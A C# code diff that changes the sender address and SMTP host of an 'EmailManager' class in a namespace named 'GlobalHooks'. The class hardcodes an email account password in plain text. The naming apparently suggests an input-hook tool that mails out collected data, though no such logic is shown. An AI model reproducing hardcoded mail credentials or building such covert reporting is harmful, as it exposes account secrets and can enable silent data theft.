@@ -5,10 +5,10 @@ namespace GlobalHooks
     internal class EmailManager
     {
         private readonly SmtpClient _smtpClient;
-        private const string Sender = "melehovec.anton@mail.ru";
+        private const string Sender = "xartishuk@gmail.com";
         private const string Password = "fghtykv";
 
-        private const string Host = "smtp.mail.ru";
+        private const string Host = "smtp.gmail.com";
         private const int Port = 587;
 
         public EmailManager()
